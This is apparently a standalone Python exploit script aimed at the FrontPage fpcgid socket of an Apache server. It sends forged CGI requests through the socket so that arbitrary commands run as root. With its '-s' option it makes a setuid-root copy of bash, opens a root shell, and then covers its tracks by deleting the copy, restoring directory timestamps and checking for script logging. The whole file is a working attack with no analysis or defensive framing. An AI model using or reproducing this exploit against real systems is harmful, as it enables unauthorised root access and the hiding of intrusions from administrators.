#!/usr/bin/python

import sys
import struct
import os
import os.path
import stat
import binascii
import re
import warnings
from time import *
from socket import *
from subprocess import *
from signal import *

signal(SIGCHLD, SIG_DFL)

fpcgisock = "/usr/local/apache/logs/fpcgisock"
httpdconf = "/usr/local/apache/etc/httpd.conf"
httpdbin = "/usr/local/apache/bin/httpd"

def checkmntflag(path,flag):
    f = open("/proc/mounts", "r")
    mnts = f.readlines()
    f.close()
    mnts = map(lambda x: x.split(), mnts)
    mnts.sort(key=lambda x: len(x[1]), reverse=True)

    for mnt in mnts:
        (mntpt,flags) = (mnt[1],mnt[3])
        if path.startswith(mntpt):
            if flag in flags.split(','):
                return True
            else:
                return False

    return False 

def bgrep(fn, s):
    f = open(fn)
    buf = f.read(4096)
    while buf > len(s):
        if s in buf:
            return True
        buf = buf[-len(s):] + f.read(4096)

    return False

def grep(fn, ex):
    for l in open(fn):
        if re.search(ex, l) != None:
            return True
    return False

def get_fpcgid_pid():
    p = Popen(["/bin/ps", "-o", "pid,ppid,euser,egroup,fname", "-C", "httpd"], stdout=PIPE)
    out = p.communicate()[0]
    rootp = []
    ppid = 0
    for l in out.split("\n"):
        f = l.split()
        if len(f) == 0:
            continue
        if f[2] == "root":
            rootp.append( (f[0], f[1]) ) # pid, ppid
        if f[2] == "nobody":
            ppid = f[1]

    if len(rootp) > 2:
        print "could not find fpcgid proc, too many root httpd"
        return -1

    for t in rootp:
        if t[1] == ppid:
            return t[0]

    return -2


def sudo(argv):    

    if not os.path.isfile(httpdbin):
        print "no " + httpdbin
        return(2)

    if not os.path.isfile(httpdconf):
        print "no " + httpdconf
        return(3)

    s = os.stat(fpcgisock)
    if not stat.S_ISSOCK(s.st_mode):
        print fpcgisock + " is not a socket"
        return(4)

    if not os.access(fpcgisock, os.W_OK):
        print "cannot write " + fpcgisock + ", must be run as 'nobody'"
        return(5)

    if get_fpcgid_pid() < 0:
        print "fpcgid not found"
        return(6)

    CGI_REQ = 1

    execpath = argv[0]
    execname = os.path.basename(execpath)

    env = execpath + "\n" + execname + "\nnulluri\n" + "x=null\n" + "+".join(argv[1:]) + "\n"
    userdir = "foo"
    # req-type, num env entries, env len
    msg = struct.pack("III", CGI_REQ, 1, len(env))
    msg += env

    if bgrep(httpdbin, "mod_suexec.c") or grep(httpdconf, "LoadModule.*mod_suexec.so"):
        #print "mod_suexec installed"
        # core mod idx, suexec mod idx, suexec cfg, userdir len
        msg += struct.pack("II16sI", 0, 2, "\x00" * 16, len(userdir))
    else:
        msg += struct.pack("II", 0, len(userdir))

    msg += userdir

#    print "env:"
#    print env
#    print "sending msg (%d):" % (len(msg))
#    print binascii.hexlify(msg)

    s = socket(AF_UNIX, SOCK_STREAM, 0)
    s.connect(fpcgisock)
    s.send(msg)
    s.close()
    sleep(0.5)
    return 0

def getsh():
    cwd = os.getcwd()
    warnings.filterwarnings("ignore")
    sh = os.tempnam(cwd)
    warnings.resetwarnings()
    if checkmntflag(cwd, "noexec"):
        print cwd + " is mounted noexec. try again."
        sys.exit(-1)
    if checkmntflag(cwd, "ro"):
        print cwd + " is mounted read-only. try again."
        sys.exit(-1)
    if not os.access(cwd, os.W_OK):
        print "can't create new files in " + cwd + ". you don't have permission"
        sys.exit(-1)
    os.stat_float_times(True)
    d = os.path.dirname(sh)
    s = os.stat(d)
    ssock = os.stat(fpcgisock)
    r = sudo(["/bin/cp", "/bin/bash", sh])
    if r != 0:
        print "copy error " + str(r)
        sys.exit(r)
    r = sudo(["/bin/chmod", "4755", sh])
    if r != 0:
        print "chmod error " + str(r)
        sys.exit(r)
    cmd = "rm -f %s; " % sh
    cmd += "touch -a -d @%.9f %s; " % (s.st_atime, d)
    cmd += "touch -m -d @%.9f %s; " % (s.st_mtime, d)
    # change socket atime? ctime is always updated on access
#    cmd += "touch -a -d @%.9f %s; " % (ssock.st_atime, fpcgisock)
    cmd += "if grep -r FPScriptLog /usr/local/apache/etc 2>/dev/null; then "
    cmd += "echo 'Script logging is enabled. Check the file following FPScriptLog in the line above.'; fi;"
    cmd += "exec python -c \"import os;os.setuid(0);os.setgid(0);os.setgroups([0]);os.system('/usr/bin/id');"
    cmd += "os.execl('/bin/bash','bash')\""
    os.execl(sh, sh, "-p", "-c", cmd)

if len(sys.argv) < 2:
    print "usage: " + sys.argv[0] + " -s | /abs/path/to/cmd [arg ...]"
    sys.exit(1)

if (sys.argv[1] == "-s"):
    getsh()
else:
    sudo(sys.argv[1:])

